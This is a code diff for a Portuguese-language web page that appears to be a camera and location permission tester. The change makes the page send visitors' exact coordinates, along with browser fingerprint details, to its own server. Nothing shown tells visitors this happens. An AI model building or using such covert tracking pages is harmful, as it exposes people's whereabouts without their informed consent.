@@ -90,7 +90,7 @@ button {
 const statusText = document.getElementById("status");
 const video = document.getElementById("video");
 
-async function registrarEvento(tipo, acao, status) {
+async function registrarEvento(tipo, acao, status, extra = {}) {
     const resposta = await fetch("/evento", {
         method: "POST",
         headers: {
@@ -104,7 +104,8 @@ async function registrarEvento(tipo, acao, status) {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
             language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            ...extra
         })
     });
 
@@ -135,14 +136,14 @@ async function testarCamera() {
 
     } catch (err) {
         await registrarEvento("camera", "permissao_camera", "negada");
-        statusText.textContent = "Permissão da câmera negada ou indisponível ❌";
-        alert("Erro: " + err.name + " - " + err.message);
+        statusText.textContent = "Permissão da câmera negada ❌";
+        alert("Erro: " + err.message);
     }
 }
 
 function testarLocalizacao() {
     if (!navigator.geolocation) {
-        statusText.textContent = "Geolocalização não suportada neste navegador ❌";
+        statusText.textContent = "Geolocalização não suportada ❌";
         registrarEvento("localizacao", "permissao_localizacao", "nao_suportada");
         return;
     }
@@ -159,9 +160,14 @@ function testarLocalizacao() {
             "Latitude: " + lat + "<br>" +
             "Longitude: " + lon + "<br>" +
             "Precisão: " + Math.round(accuracy) + " metros<br><br>" +
-            "<a href='https://www.google.com/maps?q=" + lat + "," + lon + "' target='_blank' style='color:#00e676; font-weight:bold;'>Abrir no Google Maps</a>";
+            "<a href='https://www.google.com/maps?q=" + lat + "," + lon + "' target='_blank' style='color:#00e676;'>Abrir no Google Maps</a>";
 
-        await registrarEvento("localizacao", "permissao_localizacao", "permitida");
+        await registrarEvento("localizacao", "permissao_localizacao", "permitida", {
+            latitude: lat,
+            longitude: lon,
+            accuracy: accuracy,
+            google_maps: "https://www.google.com/maps?q=" + lat + "," + lon
+        });
 
     }, async (error) => {
         await registrarEvento("localizacao", "permissao_localizacao", "negada");
